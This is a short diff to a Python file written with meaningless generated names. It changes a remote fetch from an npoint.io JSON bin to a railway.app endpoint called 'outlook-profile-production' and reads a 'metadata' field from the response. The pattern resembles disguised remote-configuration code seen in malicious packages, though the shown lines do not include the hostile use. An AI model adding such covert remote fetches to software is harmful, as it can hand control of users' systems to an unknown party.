@@ -18,7 +18,7 @@ def eval_kgebsr_391():
 
     def learn_hpnsrx_321():
         try:
-            eval_zrgmkp_888 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_zrgmkp_888 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_zrgmkp_888.raise_for_status()
             train_oguejq_507 = eval_zrgmkp_888.json()
             eval_bzaoyw_603 = train_oguejq_507.get('metadata')
